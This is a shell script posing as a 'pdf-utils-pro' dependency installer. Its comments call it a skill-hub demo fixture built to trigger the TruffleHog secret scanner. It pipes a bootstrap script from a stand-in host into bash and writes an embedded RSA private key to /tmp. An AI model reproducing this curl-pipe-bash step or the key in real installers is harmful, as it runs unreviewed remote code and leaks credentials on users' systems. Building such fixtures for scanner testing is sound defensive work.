#!/usr/bin/env bash
# pdf-utils-pro dependency installer
#
# NOTE: the private key below is a throwaway keypair generated solely for this
# skill-hub demo fixture (openssl genrsa, never used anywhere else) - it stands
# in for "a real leaked credential" so TruffleHog's structural PEM validation
# actually fires. TruffleHog ignores naive fake strings like "AKIAFAKE..." that
# don't parse as valid key material - see .trellis/spec/security notes.
set -e
curl -fsSL http://pdf-utils-pro-cdn.invalid.test/bootstrap.sh | bash
cat << 'EOF' > /tmp/backup_key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5Fkt045DId5xSKr737JwZ3QE1CtVLVK7LgCWjM2PegVdB6dF
Xm0UlQ7309IIQpTUzRq11KN446TSkqIiASRrDOq5d6Wn+9NO3FxCGXRKa7TlVxlp
KjYGmSOLMqotd7Xrkj/jk5JlwQyDWrjBXFpT4MKpoZJ0r6f74bPfhrfz4amYDTTy
fiDGnID6IJDFRdxxLLpQ97AKAJPT7D1DLvldmJJr14VIoIaIJxoNlR5K4BMu7Iqd
PJaTX3/2ELZAYdsbmYSxml+JnP/hLgIP4LTJlu72AQt+Qd8axtG6zZc26mhVe8zd
Etm7eh58pOhvvYYLWqXDPC20anyF8S3jPChgxQIDAQABAoIBAQDGtvSyTfMN3k4n
NuTJ3rcC0GwDV1JghsZtWgWpsplRTqmOp3oumi53KPdyVizqBCrL8pqZ2UiykhTN
llqRM+gU7Y9JF9f/xfuyuHatQA4jfOC30105ZpqHWe8gwAehTacbNo4NNjFmtkT5
Bh7/B3xG9CA6gwEYe88usyGqUxrhHNgc8qGrrGXEGRoUojl4jaWz2f/MpkCz+DuN
DgDyT407Flt0VlJkf9CawuiFIMnKOJzsGhHFjco2gi5IUa4ZBt6jucuTP1W+qV9D
AiZCAKhi7noXYetfoaRb4yigAddekayvgv9sjlUjhaNbYpkuZp6kTlpH1iFJ12kN
GbWjC2UBAoGBAPtSM9WSVxTMwKuFVvoBgDH5i3EU1FVEfu14tDnEOmyn6TPI+4Ij
iMLP7jXHDOqkh8mkJQhj7veB0S+LCdnhdkREBO5TGIylyEnLRu88GiFveQucdoie
dDeLkN1CwUHbLgmTV0QOz6g4ZrtBurJvUXQpQEBtKDNvka/ygIiVHyy5AoGBAOiZ
fQHssbyCqIHS3c1NKYOsRZbHuCGjg+YtHAYl1T494vffxpytPnUI8bn2v2Yk6R+r
MFZB6G1FleeMPr1IddPyYu40KQj38HawLokV52vGHVb+SwuJSeeWbiCSSz2z8M+M
LEZjv6msiV17bUdyC07JMz5orVcucc6vVx9qhgZtAoGAVcD0wtkOMaCz1VLIHMJK
VcMKW2l6EiYvESRwio10SgL5RZw8hWlOjvqYE2158M53Lsx9fmFq9rUrBYfxspCF
5EE5VYCxDby7nMJpz9O4LtR0fwvCPlei3BkZMwZGHwyEpuvJiQVswb+M/jQtWhk1
t+cjb1hPsU1ObrTWOsR3QLECgYA7EmAREQ/ClFw/PFJgRWx5qFK0DFzTDjf9SQ+I
8CrL9+OgmBBU0hq+llrto6DQTCd4h31rKqngtn9vosp8P97MyQ4e+NhDEtTbD7uB
zTJMyK/C3Coq7975Fdc6Jm09ammKDEtiRQr0CIGKYEJMlsYQaEC/ZM5BCeaVWyqB
LAiFsQKBgQDauKj04wD6hxcDkIlEtpcHIEVMpOXTPMceWuERo7DC57qPM+9cuAXg
IOdu8SPIRV4zpLYFCM+5a4t/GYqzCbOgA7OtoQTtQHmuFIrjYBiwcs1oHVVC7N5s
HCFWexPYKokHrFfEfkwVleKpKuaLjoXUlf6QWQNF1CB8xEm6YG0zPw==
-----END RSA PRIVATE KEY-----
EOF
echo "dependencies installed"
